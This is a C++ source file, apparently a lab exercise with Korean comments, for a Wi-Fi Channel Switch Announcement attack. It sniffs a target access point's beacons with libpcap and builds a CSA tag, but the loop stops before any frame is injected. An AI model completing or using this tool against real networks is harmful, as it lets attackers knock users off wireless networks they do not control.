#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <pcap.h>
#include "param.h"
#include "dot11.h"
#include "radiotap.h"

void attackLoop(pcap_t* handle) {
    Mac station;
    if (args_.hasStation)
        station = args_.staMac;
    else
        station = Mac("ff:ff:ff:ff:ff:ff");

    int count = 0;
    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* pkt;

        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res < 0) break;

        // radiotap 길이
        uint16_t rtLen;
        memcpy(&rtLen, pkt + 2, sizeof(rtLen));

        int minLen = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
        if ((int)header->caplen < minLen) continue;

        // beacon 확인
        Dot11Hdr dot11;
        memcpy(&dot11, pkt + rtLen, sizeof(Dot11Hdr));
        if (!dot11.isBeacon()) continue;
        if (!(dot11.addr2_ == args_.apMac)) continue;

        // FCS 크기
        RadioTapHdr rtHdr;
        memcpy(&rtHdr, pkt, sizeof(RadioTapHdr));
        size_t fcsSize = rtHdr.get_fcs();

        // tagged params 범위
        int tagStart = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
        int tagEnd = (int)header->caplen - (int)fcsSize;

        // CSA 태그 준비
        BeaconHdr::CsaTag csa;
        csa.number = 0x25;
        csa.length = 0x03;
        csa.channelSwitchMode = 0x01;
        csa.newChannel = 0x0B;
        csa.channelSwitchCount = 0x03;


    }
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    printInfo();
    attackLoop(handle);

    pcap_close(handle);
    return 0;
}